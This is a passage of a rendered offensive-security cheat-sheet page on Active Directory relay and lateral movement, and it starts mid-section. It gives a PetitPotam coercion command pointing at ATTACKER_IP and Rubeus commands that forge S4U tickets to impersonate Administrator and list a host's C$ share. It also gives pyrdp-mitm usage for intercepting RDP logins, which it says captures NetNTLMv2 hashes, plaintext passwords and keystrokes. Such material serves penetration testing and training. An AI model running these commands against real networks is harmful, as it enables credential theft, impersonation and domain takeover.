<a id="__codelineno-15-8" name="__codelineno-15-8" href="#__codelineno-15-8"></a><span class="n">PetitPotam</span><span class="p">.</span><span class="n">exe</span> <span class="s2">&quot;ATTACKER_NETBIOS_NAME@PORT/randomfile.txt&quot;</span> <span class="s2">&quot;ATTACKER_IP&quot;</span>
</code></pre></div></li>
<li>Use the created account to ask for a service ticket: 
    <div class="highlight"><pre><span></span><code><a id="__codelineno-16-1" name="__codelineno-16-1" href="#__codelineno-16-1"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">hash</span> <span class="p">/</span><span class="n">domain</span><span class="p">:</span><span class="n">purple</span><span class="p">.</span><span class="n">lab</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">WVLFLLKZ</span><span class="p">$</span> <span class="p">/</span><span class="n">password</span><span class="p">:</span><span class="s1">&#39;iUAL)l&lt;i$;UzD7W&#39;</span>
<a id="__codelineno-16-2" name="__codelineno-16-2" href="#__codelineno-16-2"></a><span class="p">.\</span><span class="n">Rubeus</span><span class="p">.</span><span class="n">exe</span> <span class="n">s4u</span> <span class="p">/</span><span class="n">user</span><span class="p">:</span><span class="n">WVLFLLKZ</span><span class="p">$</span> <span class="p">/</span><span class="n">aes256</span><span class="p">:</span><span class="n">E0B3D87B512C218D38FAFDBD8A2EC55C83044FD24B6D740140C329F248992D8F</span> <span class="p">/</span><span class="n">impersonateuser</span><span class="p">:</span><span class="n">Administrator</span> <span class="p">/</span><span class="n">msdsspn</span><span class="p">:</span><span class="n">host</span><span class="p">/</span><span class="n">pc1</span><span class="p">.</span><span class="n">purple</span><span class="p">.</span><span class="n">lab</span> <span class="p">/</span><span class="n">altservice</span><span class="p">:</span><span class="n">cifs</span> <span class="p">/</span><span class="n">nowrap</span> <span class="p">/</span><span class="n">ptt</span>
<a id="__codelineno-16-3" name="__codelineno-16-3" href="#__codelineno-16-3"></a><span class="nb">ls </span><span class="p">\\</span><span class="n">PC1</span><span class="p">.</span><span class="n">purple</span><span class="p">.</span><span class="n">lab</span><span class="p">\</span><span class="n">c</span><span class="p">$</span>
<a id="__codelineno-16-4" name="__codelineno-16-4" href="#__codelineno-16-4"></a><span class="c"># IP of PC1: 10.0.0.4</span>
</code></pre></div></li>
</ul>
<h2 id="man-in-the-middle-rdp-connections-with-pyrdp-mitm">Man-in-the-middle RDP connections with pyrdp-mitm</h2>
<ul>
<li>https://github.com/GoSecure/pyrdp</li>
<li>https://www.gosecure.net/blog/2018/12/19/rdp-man-in-the-middle-smile-youre-on-camera/</li>
</ul>
<p><strong>Usage</strong></p>
<div class="highlight"><pre><span></span><code><a id="__codelineno-17-1" name="__codelineno-17-1" href="#__codelineno-17-1"></a>pyrdp-mitm.py<span class="w"> </span>&lt;IP&gt;
<a id="__codelineno-17-2" name="__codelineno-17-2" href="#__codelineno-17-2"></a>pyrdp-mitp.py<span class="w"> </span>&lt;IP&gt;:&lt;PORT&gt;<span class="w"> </span><span class="c1"># with custom port</span>
<a id="__codelineno-17-3" name="__codelineno-17-3" href="#__codelineno-17-3"></a>pyrdp-mitm.py<span class="w"> </span>&lt;IP&gt;<span class="w"> </span>-k<span class="w"> </span>private_key.pem<span class="w"> </span>-c<span class="w"> </span>certificate.pem<span class="w"> </span><span class="c1"># with custom key and certificate</span>
</code></pre></div>
<p><strong>Exploitation</strong></p>
<ul>
<li>If Network Level Authentication (NLA) is enabled, you will obtain the client's NetNTLMv2 challenge</li>
<li>If NLA is disabled, you will obtain the password in plaintext</li>
<li>Other features are available such as keystroke recording</li>
</ul>
<p><strong>Alternatives</strong></p>
<ul>
<li>S3th: https://github.com/SySS-Research/Seth, performs ARP spoofing prior to launching the RDP listener    </li>
</ul>
<h2 id="references">References</h2>
<ul>
<li><a href="https://www.secureauth.com/blog/playing-relayed-credentials">Playing with Relayed Credentials - June 27, 2018</a></li>
<li><a href="https://dirkjanm.io/exploiting-CVE-2019-1040-relay-vulnerabilities-for-rce-and-domain-admin/">Exploiting CVE-2019-1040 - Combining relay vulnerabilities for RCE and Domain Admin - Dirk-jan Mollema</a></li>
<li><a href="https://pentestlab.blog/2021/10/20/lateral-movement-webclient/">Lateral Movement  WebClient</a></li>
<li><a href="https://blog.preempt.com/drop-the-mic">Drop the MIC - CVE-2019-1040 - Marina Simakov - Jun 11, 2019</a></li>
<li><a href="https://medium.com/@adam.toscher/top-five-ways-i-got-domain-admin-on-your-internal-network-before-lunch-2018-edition-82259ab73aaa">Top Five Ways I Got Domain Admin on Your Internal Network before Lunch (2018 Edition) - Adam Toscher</a></li>
</ul>







  
    
  
  


  <aside class="md-source-file">
    
      
  <span class="md-source-file__fact">
    <span class="md-icon" title="Last update">
      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M21 13.1c-.1 0-.3.1-.4.2l-1 1 2.1 2.1 1-1c.2-.2.2-.6 0-.8l-1.3-1.3c-.1-.1-.2-.2-.4-.2m-1.9 1.8-6.1 6V23h2.1l6.1-6.1-2.1-2M12.5 7v5.2l4 2.4-1 1L11 13V7h1.5M11 21.9c-5.1-.5-9-4.8-9-9.9C2 6.5 6.5 2 12 2c5.3 0 9.6 4.1 10 9.3-.3-.1-.6-.2-1-.2s-.7.1-1 .2C19.6 7.2 16.2 4 12 4c-4.4 0-8 3.6-8 8 0 4.1 3.1 7.5 7.1 7.9l-.1.2v1.8Z"/></svg>
    </span>
    <span class="git-revision-date-localized-plugin git-revision-date-localized-plugin-date">January 15, 2024</span>
  </span>

    
    
    
    
  </aside>





                
              </article>
            </div>
          
          
<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
        </div>
        
          <button type="button" class="md-top md-icon" data-md-component="top" hidden>
  
  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M13 20h-2V8l-5.5 5.5-1.42-1.42L12 4.16l7.92 7.92-1.42 1.42L13 8v12Z"/></svg>
  Back to top
</button>
        
      </main>
      
        <footer class="md-footer">
  
  <div class="md-footer-meta md-typeset">
    <div class="md-footer-meta__inner md-grid">
      <div class="md-copyright">
  
  
    Made with
    <a href="https://squidfunk.github.io/mkdocs-material/" target="_blank" rel="noopener">
      Material for MkDocs
    </a>
  
</div>
      
    </div>
  </div>
</footer>
      
    </div>
    <div class="md-dialog" data-md-component="dialog">
      <div class="md-dialog__inner md-typeset"></div>
    </div>
    
    
    <script id="__config" type="application/json">{"base": "../..", "features": ["content.code.copy", "navigation.tracking", "navigation.top"], "search": "../../assets/javascripts/workers/search.f886a092.min.js", "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}}</script>
    
    
      <script src="../../assets/javascripts/bundle.d7c377c4.min.js"></script>
      
    
  </body>
</html>